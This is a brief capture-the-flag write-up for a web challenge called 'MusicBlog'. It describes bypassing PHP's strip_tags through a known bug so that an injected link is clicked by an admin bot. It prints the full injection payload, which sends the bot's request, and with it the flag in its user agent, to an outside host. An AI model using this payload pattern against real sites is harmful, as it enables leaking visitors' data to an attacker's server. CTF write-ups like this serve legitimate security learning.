### MusicBlog

- Using the php [bug](https://bugs.php.net/bug.php?id=78814), bypass strip_tags to inject an `a` tag.
- The bot clicks the element with the id `like`, so inject an `a` tag with the id=like.
- Flag is in the user agent, so the bot clicking our link will give us the flag:

```
[[lol"></audio><a/udio id="like" href="http://hax.perfect.blue:6969/lel">HAXXX<audio src="]]
```
